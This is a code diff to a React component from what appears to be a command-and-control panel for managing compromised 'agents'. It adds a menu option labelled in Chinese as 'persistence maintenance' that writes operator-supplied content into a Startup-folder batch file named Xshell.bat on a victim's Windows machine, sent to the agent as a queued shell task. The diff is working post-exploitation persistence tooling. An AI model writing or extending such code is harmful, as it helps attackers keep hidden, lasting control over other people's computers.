@@ -1,6 +1,7 @@
 import { useEffect, useState } from 'react';
 import { Link } from 'react-router-dom';
 import { getAgents, deleteAgent } from '../api/agents';
+import { createTask } from '../api/tasks';
 import ContextMenu from './ContextMenu';
 import ScreenshotModal from './ScreenshotModal';
 import type { Agent } from '../types';
@@ -91,8 +92,38 @@ export default function AgentList() {
           items={[
             {
               label: 'Take Screenshot',
-              icon: '📸',
+              icon: '\u{1F4F8}',
               onClick: () => setScreenshotAgent(contextMenu.agent),
+            },
+            {
+              label: '权限维持',
+              icon: '\u{1F527}',
+              onClick: () => {},
+              children: [
+                {
+                  label: 'Windows启动目录',
+                  icon: '\u{1F4C1}',
+                  disabled: contextMenu.agent.os !== 'windows',
+                  onClick: async () => {
+                    const input = prompt('Enter content to write to startup file:');
+                    if (!input) return;
+                    const username = contextMenu.agent.username;
+                    const cmd = `echo ${input} > "C:\\Users\\${username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Xshell.bat"`;
+                    try {
+                      await createTask(contextMenu.agent.id, {
+                        command: 'shell',
+                        arguments: cmd,
+                      });
+                      alert(`✓ Persistence task queued for ${username}`);
+                    } catch (err: unknown) {
+                      const msg =
+                        (err as { response?: { data?: { error?: { message?: string } } } })
+                          ?.response?.data?.error?.message;
+                      alert(`✗ Failed: ${msg || 'Could not create task'}`);
+                    }
+                  },
+                },
+              ],
             },
           ]}
           onClose={() => setContextMenu(null)}
